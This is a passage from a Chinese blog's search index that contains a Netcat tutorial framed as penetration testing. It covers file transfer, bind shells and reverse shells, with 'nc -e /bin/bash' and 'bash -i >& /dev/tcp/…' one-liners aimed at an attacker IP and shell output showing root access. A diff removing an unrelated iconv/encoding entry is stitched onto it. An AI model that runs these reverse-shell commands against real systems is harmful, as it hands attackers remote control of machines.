Server: nginx/1.12.0 Date: Sun, 28 May 2017 08:06:19 GMT Content-Type: text/html Content-Length: 173 Connection: close 1.4 使用Netcat进行文件传输 在这个例子中，我们将使用Netcat连接传输一个文本文件。假设我们在目标主机上执行远程命令，我们希望将文件从攻击主机传输到目标主机。首先，我们需要在目标主机上设置一个侦听器，并从攻击主机连接到它。我们将使用端口8080用于此目的，我们将该文件安全保存到桌面: 1nc -lvp 8080&gt; 1.txt 在攻击主机上，我们连接到8080端口并发送文件名称transfer.txt： 1nc 192.168.100.107 8080 &lt; 1.txt 2 用Netcat进行黑客攻击第2部分：绑定和反向shellNetcat反向reverse shell 在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。 在下面的内容中我们将展示使用bind shell和reverse shell。下面将使用4444端口，但请注意，这可以是任何开放端口。实际上，通常您需要使用更常见的端口，如80和443来设置反向shell，因为这些端口是更常见的打开。 NC reverse shell 工作原理: 12攻击主机A执行: nc -lvp 4444 ; 监听被攻击者链接 12被攻击主机B执行: nc xxx.xxx.xxx.xxx 4444 -e /bin/bash ; 将bash shell 权限提供给攻击者 实现控制权限的转移; 实现通信后: 在攻击主机A上执行命令，即可操作被攻击者B 缺点: 此时被攻击者B 需要使用Netcat命令， 而且普通 GNU Linux nc 并没有 -e { -e filename program to exec after connect [dangerous]} 参数; 顾此种反向链接并不适用; 2.1 使用Bash 来代替Nc实现反向链接;12被攻击主机B: bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 12攻击者A: nc -lvp 4444 1234567891011A机代码:[root@virtualS ~]# nc -lvp 4444Connection from 111.15.33.114:17835 ## 此时B机执行转移指令 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~#root@kailvirtual:~# ididuid=0(root) gid=0(root) groups=0(root)root@kailvirtual:~# 1234567891011 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 命令解释: bash: -i if the -i option is present, the shell is interactive shell: 0/1/2 分别代表Linux标准输入，输出，异常 即 C编程中的 stdin, stdout, stderr 0&gt;&amp;1 指 将标准输入完全输出到标准输出中; 采用&amp;可以将 0/1 绑定在一起。这条命令的作用标准输入将和标准输出同用一个文件描述符，说人话就是错误输入将会和标准输出输出到同一个地方。 2.2 Netcat正向bind Shellbind shell是一个绑定到目标主机上的特定端口以监听即将到来的连接的shell。我们来看看一个Netcat正向bind shell的原理: 123456789攻击主机A: rocky@mac: nc 192.168.1.9 4444 id uid=0(root) gid=0(root) groups=0(root) echo $HOSTNAME kailvirtual 相同点: 我们都需要被攻击者将其shell控制权限交给我们 将shell command 以数据流的形式重定向到被攻击主机的Bash shell中; 更多Nc 学习参照链接]]></content>
@@ -1237,19 +1250,6 @@
       <tags>
         <tag>Linux</tag>
         <tag>Commands</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Linux 字符编码 查看与转换]]></title>
-    <url>%2F2017%2F07%2F09%2Fcommands%2FLinux_encoding%2F</url>
-    <content type="text"><![CDATA[不同操作系统之间的换行表现形式不同需要常用编码转化 以及 文件转码; Linux 查看文件编码格式 Vim 查看文件编码 1set fileencoding // 即可显示文件编码格式 若想解决Vim查看文件乱码问题， 可以在 .vimrc 文件添加 1set encoding=utf-8 fileencoding=utf-8, cp936,gb2312 等 enca (yum install enca) 查看文件编码 1enca filename // enca对某些GBK编码文件并不识别 Unrecognized encoding 文件编码转化 Vim直接转化文件编码1set fileencoding=utf-8 iconv 1iconv -f encoding -t encoding inputfile 例如: 将一个utf-8 编码转化为GBK编码 1iconv -f utf-8 -t gbk file -o file2 1234567891011121314151617181920iconv命令用于转换指定文件的编码,默认输出到标准输出设备,亦可指定输出文件。 用法： iconv [选项...] [文件...] 有如下选项可用: 输入/输出格式规范： -f, --from-code=名称 原始文本编码 -t, --to-code=名称 输出编码 信息： -l, --list 列举所有已知的字符集 输出控制： -c 从输出中忽略无效的字符 -o, --output=FILE 输出文件 -s, --silent 关闭警告 --verbose 打印进度信息 -?, --help 给出该系统求助列表 --usage 给出简要的用法信息 -V, --version 打印程序版本号 例子: iconv -f utf-8 -t gb2312 aaa.txt &gt;bbb.txt 这个命令读取aaa.txt文件，从utf-8编码转换为gb2312编码,其输出定向到bbb.txt文件。 enconv将一个GBK编码转化为 utf-8编码 1enconv -L zh_CN -x utf-8 filename dos2unix : window 文件 cpoy 到 linux 格式转化 DOS下的文本文件是以\r\n作为断行标志的 Mac文本是以 \r 作为换行标志 Linux文本以 \n 作为换行标志 1dos2unix filename]]></content>
-      <categories>
-        <category>命令</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Commands</tag>
-        <tag>Vim</tag>
       </tags>
   </entry>
 </search>
